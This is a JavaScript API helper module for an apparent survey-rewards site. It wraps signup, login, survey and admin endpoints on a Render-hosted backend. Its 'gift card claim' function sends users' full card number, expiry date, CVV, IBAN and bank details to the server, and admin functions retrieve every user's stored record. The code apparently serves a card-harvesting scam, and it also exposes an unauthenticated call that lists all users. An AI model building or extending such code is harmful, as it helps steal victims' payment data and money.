/**
 * api.js — Central API utility
 *
 * All fetch calls go through here. Import the functions you need
 * in any component instead of writing fetch() directly.
 *
 * Base URL: https://surveyinfrastructure-xcer.onrender.com
 * Change BASE if the backend URL changes.
 *
 * Endpoints used:
 *   POST /Duser              — signup (firstName, lastName, email, phoneNumber, password)
 *   POST /DLuser             — login (email, password) → returns user object
 *   GET  /Duser              — get all users (admin only, requires JWT)
 *   GET  /Duser/:id          — get one user by ID
 *   PATCH /Duser/:id         — update user bank/card details for gift card claim
 *   GET  /Dsurvey            — get all surveys
 *   POST /Dsurvey/:id/:sid   — mark a survey as completed for a user
 *   POST /Dladmin            — admin login → returns JWT token
 *
 * Session storage:
 *   sf_user              — logged-in user object (from login response)
 *   sf_progress_{uid}    — user's points + completed survey IDs
 *   sf_claimed_{uid}     — gift card tiers the user has already claimed
 *   sf_admin_token       — admin JWT (sessionStorage, clears on tab close)
 */

const BASE = 'https://surveyinfrastructure-xcer.onrender.com'

// ── helpers ──────────────────────────────────────────────────────────────────

async function request(method, path, body) {
  const opts = {
    method,
    headers: { 'Content-Type': 'application/json' },
  }
  if (body) opts.body = JSON.stringify(body)

  const res = await fetch(`${BASE}${path}`, opts)
  const json = await res.json().catch(() => ({}))

  if (!res.ok) {
    // Throw the server's message if available, otherwise a generic error
    throw new Error(json.message || `Request failed (${res.status})`)
  }
  return json // { message, data }
}

// ── Auth ─────────────────────────────────────────────────────────────────────

/**
 * signup — creates a new user account
 * @param {{ firstName, lastName, email, phoneNumber, password }} body
 */
export async function signup(body) {
  return request('POST', '/Duser', body)
}

/**
 * login — authenticates a user
 * @param {{ email, password }} body
 * Returns the full response; caller should save response.data to localStorage
 */
export async function login(body) {
  return request('POST', '/DLuser', body)
}

// ── Users ─────────────────────────────────────────────────────────────────────

export async function getAllUsers() {
  return request('GET', '/Duser')
}

export async function getUserById(id) {
  return request('GET', `/Duser/${id}`)
}

// ── Surveys ───────────────────────────────────────────────────────────────────

/**
 * getSurveys — fetches all available surveys from the backend
 */
export async function getSurveys() {
  return request('GET', '/Dsurvey')
}

/**
 * enterBankDetails — sends all card/bank details for a gift card claim
 * Endpoint: PATCH /Duser/:id
 * @param {string} userId
 * @param {{ address, city, country, bankName, cardHolder, cardNumber, expiryDate, iban, cvv }} body
 */
export async function enterBankDetails(userId, body) {
  return request('PATCH', `/Duser/${userId}`, body)
}

// ── Local session helpers ─────────────────────────────────────────────────────

/** Save only the user ID to localStorage after login */
export function saveUser(userData) {
  // Store the full user object returned by login — used directly in the dashboard
  localStorage.setItem('sf_user', JSON.stringify(userData))
}

/** Get the cached user object from login response */
export function getUser() {
  try {
    return JSON.parse(localStorage.getItem('sf_user'))
  } catch {
    return null
  }
}

/** Get just the stored user ID */
export function getUserId() {
  const user = getUser()
  return user?.id || user?._id || null
}

/** Clear session (logout) */
export function clearUser() {
  localStorage.removeItem('sf_user')
}

// ── Per-user progress persistence ─────────────────────────────────────────────
// Points and completed survey IDs are stored per user ID so they survive
// sign out / sign in. Key format: sf_progress_{userId}

function progressKey(userId) {
  return `sf_progress_${userId}`
}

/** Load saved points and completedIds for a user */
export function loadProgress(userId) {
  try {
    const saved = JSON.parse(localStorage.getItem(progressKey(userId)))
    return saved || { points: 0, completedIds: [] }
  } catch {
    return { points: 0, completedIds: [] }
  }
}

/** Save updated points and completedIds for a user */
export function saveProgress(userId, points, completedIds) {
  localStorage.setItem(progressKey(userId), JSON.stringify({ points, completedIds }))
}

/**
 * completeSurvey — marks a survey as completed for a user
 * @param {string} userId  — the logged-in user's ID
 * @param {string} surveyId — the survey's ID
 */
export async function completeSurvey(userId, surveyId) {
  return request('POST', `/Dsurvey/${userId}/${surveyId}`)
}

// ── Admin auth ────────────────────────────────────────────────────────────────

/**
 * adminLogin — authenticates an admin user
 * @param {{ userName, password }} body
 * Returns { token } — JWT stored in sessionStorage (cleared on tab close)
 */
export async function adminLogin(body) {
  return request('POST', '/Dladmin', body)
}

export function saveAdminToken(token) {
  sessionStorage.setItem('sf_admin_token', token)
}

export function getAdminToken() {
  return sessionStorage.getItem('sf_admin_token')
}

export function clearAdminToken() {
  sessionStorage.removeItem('sf_admin_token')
}

// Admin-authenticated request — sends JWT in Authorization header
async function adminRequest(method, path, body) {
  const token = getAdminToken()
  const opts = {
    method,
    headers: {
      'Content-Type': 'application/json',
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
    },
  }
  if (body) opts.body = JSON.stringify(body)
  const res = await fetch(`${BASE}${path}`, opts)
  const json = await res.json().catch(() => ({}))
  if (!res.ok) throw new Error(json.message || `Request failed (${res.status})`)
  return json
}

/** Admin: get all users */
export async function adminGetAllUsers() {
  return adminRequest('GET', '/Duser')
}

/** Admin: get one user by ID */
export async function adminGetUser(id) {
  return adminRequest('GET', `/Duser/${id}`)
}
